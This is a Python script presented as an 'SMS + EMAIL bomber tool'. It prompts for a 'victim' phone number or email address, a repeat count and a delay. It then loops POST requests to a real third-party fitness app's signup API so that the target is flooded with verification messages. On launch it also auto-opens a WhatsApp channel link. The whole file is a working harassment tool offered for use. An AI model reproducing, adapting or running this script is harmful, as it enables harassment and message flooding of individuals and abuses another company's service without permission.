import os
import asyncio
import aiohttp
import time

API_URL = "https://prod.fitflexapp.com/api/users/signupV1"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

async def send_bomb(session, method, target):
    payload = {
        "type": "msisdn" if method == "phone" else "email",
        "user_platform": "Android",
        "country_id": "162",
        "msisdn": target if method == "phone" else "",
        "email": target if method == "email" else ""
    }
    try:
        async with session.post(API_URL, json=payload, timeout=10) as resp:
            return resp.status == 200
    except:
        return False

async def bomber(method):
    target = input("\n🎯 ENTER YOUR VICTIM " + ("NUMBER (e.g. +923001234567): " if method == "phone" else "EMAIL: "))
    count = int(input("🔁 ENTER AMOUNT OF BOMBING: "))
    delay = float(input("⏱️ ENTER SCE OF DELAYS (seconds): "))

    success = 0
    failed = 0

    async with aiohttp.ClientSession() as session:
        for i in range(count):
            ok = await send_bomb(session, method, target)
            if ok:
                success += 1
            else:
                failed += 1

            percent = int((i + 1) / count * 100)
            bar = "█" * (percent // 10) + "░" * (10 - percent // 10)
            print(f"\r📡 Progress: [{bar}] {percent}% | ✅ {success} ❌ {failed}", end="")
            await asyncio.sleep(delay)

    print(f"\n\n✅ DONE!\nTotal Sent: {count}\n🟢 Success: {success}, 🔴 Failed: {failed}")

async def main():
    # 🔗 Auto-open WhatsApp Channel
    os.system("xdg-open https://whatsapp.com/channel/0029VavHzv259PwTIz1XxJ09")

    input("👉 Press Enter to continue...")
    clear()

    print("╔════════════════════════════╗")
    print("║     OLD-X SMS + EMAIL     ║")
    print("║         BOMBER TOOL       ║")
    print("╚════════════════════════════╝\n")

    print("📱 ENTER 1 TO SMS BOMBING")
    print("✉️  ENTER 2 TO EMAIL BOMBING")
    
    choice = input("\n🎯 ENTER YOUR CHOICE: ").strip()

    if choice == "1":
        await bomber("phone")
    elif choice == "2":
        await bomber("email")
    else:
        print("❌ Invalid choice. Exiting...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🚫 Tool stopped by user.")
